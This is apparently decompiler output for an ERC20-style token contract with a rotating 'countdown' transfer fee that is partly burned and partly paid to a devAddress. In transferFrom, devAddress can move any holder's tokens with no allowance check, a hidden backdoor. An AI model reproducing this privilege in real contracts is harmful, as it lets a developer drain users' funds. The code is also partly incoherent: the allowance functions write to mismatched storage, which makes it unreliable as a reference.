contract main {




// =====================  Runtime code  =====================


mapping of uint256 stor1;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 stor6;
uint256 countdown;
address devAddress;
mapping of uint256 balanceOf;
mapping of uint256 allowance;

function name() payable {
    return name[0 len name.length]
}

function decimals() payable {
    return decimals
}

function devAddress() payable {
    return devAddress
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function countdown() payable {
    return countdown
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function totalSupply() payable {
    return (stor6 - balanceOf[0])
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > stor1[address(msg.sender)][address(arg1)]:
        revert with 0, 
                    32,
                    37,
                    0x7345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a6572,
                    mem[165 len 27],
                    mem[219 len 5]
    if not msg.sender:
        revert with 0, 32, 36, 0x7745524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[296 len 28]
    if not arg1:
        revert with 0, 32, 34, 0xfe45524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[294 len 30]
    stor1[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((stor1[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if stor1[address(msg.sender)][address(arg1)] + arg2 < stor1[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7745524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0xfe45524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    stor1[address(msg.sender)][address(arg1)] += arg2
    emit Approval((stor1[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(msg.sender)] -= arg2
    if msg.sender == devAddress:
        if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if not arg2 / 100:
            if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += arg2
            if balanceOf[0] < balanceOf[0]:
                revert with 0, 'SafeMath: addition overflow'
            if balanceOf[stor8] < balanceOf[stor8]:
                revert with 0, 'SafeMath: addition overflow'
            emit Transfer(arg2, msg.sender, arg1);
            emit Transfer(0, msg.sender, 0);
            emit Transfer(0, msg.sender, devAddress);
        else:
            require arg2 / 100
            if arg2 / 100 * countdown / arg2 / 100 != countdown:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg2 / 100 * countdown / 100:
                if balanceOf[address(arg1)] + arg2 - (arg2 / 100 * countdown) < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 / 100 * countdown)
                if balanceOf[0] < balanceOf[0]:
                    revert with 0, 'SafeMath: addition overflow'
                if balanceOf[stor8] + (arg2 / 100 * countdown) < balanceOf[stor8]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor8] += arg2 / 100 * countdown
                emit Transfer((arg2 - (arg2 / 100 * countdown)), msg.sender, arg1);
                emit Transfer(0, msg.sender, 0);
                emit Transfer((arg2 / 100 * countdown), msg.sender, devAddress);
            else:
                require arg2 / 100 * countdown / 100
                if 85 * arg2 / 100 * countdown / 100 / arg2 / 100 * countdown / 100 != 85:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if balanceOf[address(arg1)] + arg2 - (arg2 / 100 * countdown) < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 / 100 * countdown)
                if balanceOf[0] + (85 * arg2 / 100 * countdown / 100) < balanceOf[0]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[0] += 85 * arg2 / 100 * countdown / 100
                if balanceOf[stor8] + (arg2 / 100 * countdown) - (85 * arg2 / 100 * countdown / 100) < balanceOf[stor8]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor8] = balanceOf[stor8] + (arg2 / 100 * countdown) - (85 * arg2 / 100 * countdown / 100)
                emit Transfer((arg2 - (arg2 / 100 * countdown)), msg.sender, arg1);
                emit Transfer((85 * arg2 / 100 * countdown / 100), msg.sender, 0);
                emit Transfer(((arg2 / 100 * countdown) - (85 * arg2 / 100 * countdown / 100)), msg.sender, devAddress);
        if countdown > 0:
            countdown--
        else:
            if not countdown:
                countdown = 100
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: subtraction overflow'
    balanceOf[address(arg1)] -= arg3
    if msg.sender == devAddress:
        if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if not arg3 / 100:
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            allowance[address(arg1)][address(msg.sender)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            if balanceOf[0] < balanceOf[0]:
                revert with 0, 'SafeMath: addition overflow'
            if balanceOf[stor8] < balanceOf[stor8]:
                revert with 0, 'SafeMath: addition overflow'
            emit Transfer(arg3, arg1, arg2);
            emit Transfer(0, msg.sender, 0);
            emit Transfer(0, msg.sender, devAddress);
        else:
            require arg3 / 100
            if arg3 / 100 * countdown / arg3 / 100 != countdown:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg3 / 100 * countdown / 100:
                if arg3 > allowance[address(arg1)][address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                if balanceOf[address(arg2)] + arg3 - (arg3 / 100 * countdown) < balanceOf[address(arg2)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * countdown)
                if balanceOf[0] < balanceOf[0]:
                    revert with 0, 'SafeMath: addition overflow'
                if balanceOf[stor8] + (arg3 / 100 * countdown) < balanceOf[stor8]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor8] += arg3 / 100 * countdown
                emit Transfer((arg3 - (arg3 / 100 * countdown)), arg1, arg2);
                emit Transfer(0, msg.sender, 0);
                emit Transfer((arg3 / 100 * countdown), msg.sender, devAddress);
            else:
                require arg3 / 100 * countdown / 100
                if 85 * arg3 / 100 * countdown / 100 / arg3 / 100 * countdown / 100 != 85:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if arg3 > allowance[address(arg1)][address(msg.sender)]:
                    revert with 0, 'SafeMath: subtraction overflow'
                allowance[address(arg1)][address(msg.sender)] -= arg3
                if balanceOf[address(arg2)] + arg3 - (arg3 / 100 * countdown) < balanceOf[address(arg2)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 / 100 * countdown)
                if balanceOf[0] + (85 * arg3 / 100 * countdown / 100) < balanceOf[0]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[0] += 85 * arg3 / 100 * countdown / 100
                if balanceOf[stor8] + (arg3 / 100 * countdown) - (85 * arg3 / 100 * countdown / 100) < balanceOf[stor8]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor8] = balanceOf[stor8] + (arg3 / 100 * countdown) - (85 * arg3 / 100 * countdown / 100)
                emit Transfer((arg3 - (arg3 / 100 * countdown)), arg1, arg2);
                emit Transfer((85 * arg3 / 100 * countdown / 100), msg.sender, 0);
                emit Transfer(((arg3 / 100 * countdown) - (85 * arg3 / 100 * countdown / 100)), msg.sender, devAddress);
    return 1
}



}
